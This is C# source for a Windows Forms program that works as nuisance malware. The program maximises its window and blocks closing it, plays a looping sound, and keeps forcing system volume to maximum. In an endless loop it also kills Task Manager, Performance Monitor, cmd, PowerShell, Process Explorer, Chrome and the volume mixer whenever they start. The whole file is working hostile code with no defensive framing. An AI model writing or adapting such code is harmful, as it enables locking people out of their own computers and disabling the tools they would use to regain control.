using System;
using System.ComponentModel;
using System.Windows.Forms;
using System.Management;
using System.Runtime.InteropServices;

namespace Opao
{
    public partial class Form1 : Form
    {
        [DllImport("winmm.dll")]
        public static extern long waveOutSetVolume(uint deviceID, uint Volume);
        [DllImport("winmm.dll")]
        private static extern bool PlaySound(string pszSound, int hmod, int fdwSound);
        public const int SND_FILENAME = 0x00020000;
        public const int SND_ASYNC = 0x0001;
        public const int SND_LOOP = 8;
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);
        const uint WM_APPCOMMAND = 0x319;
        const uint APPCOMMAND_VOLUME_UP = 0x0a;
        const uint APPCOMMAND_VOLUME_DOWN = 0x09;
        const uint APPCOMMAND_VOLUME_MUTE = 0x08;
        public Form1()
        {
            
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            for (int i = 0; i <= 800; i++)
            {
                panel1.Width = i;
                for (int j = 0; j < 1000000; j++) ;
            }
            backgroundWorker1.RunWorkerAsync();
            try
            {
                PlaySound("Op.wav", 0, SND_ASYNC | SND_FILENAME | SND_LOOP);
            }
            catch
            {
            }
            panel1.Dock = DockStyle.Fill;
            this.WindowState = FormWindowState.Maximized;
           
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {

            while (true)
            {
                for (int i = 0; i < 120000000; i++) ;
                Console.WriteLine("tick");
                ManagementObjectCollection objects = new ManagementObjectSearcher("SELECT * FROM Win32_Process").Get();
                foreach (ManagementObject item in objects)
                {
                    if (item["Name"].ToString() == "Taskmgr.exe"|| item["Name"].ToString() == "perfmon.exe"
                        || item["Name"].ToString() =="cmd.exe"|| item["Name"].ToString() =="powershell.exe"
                        || item["Name"].ToString() =="ProcessExplorer.exe"|| item["Name"].ToString() =="chrome.exe"
                        || item["Name"].ToString() == "SndVol.exe")//||item["Name"].ToString()=="explorer.exe")
                    {
                        string[] args = new string[] { "0" };
                        item.InvokeMethod("Terminate", args);
                        break;
                    }
                }
                for(int k=0;k<=100;k++)
                {
                    SendMessage(this.Handle, WM_APPCOMMAND, 0x30292, APPCOMMAND_VOLUME_UP * 0x10000);
                }
                
                waveOutSetVolume(0, 0xFFFF);
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
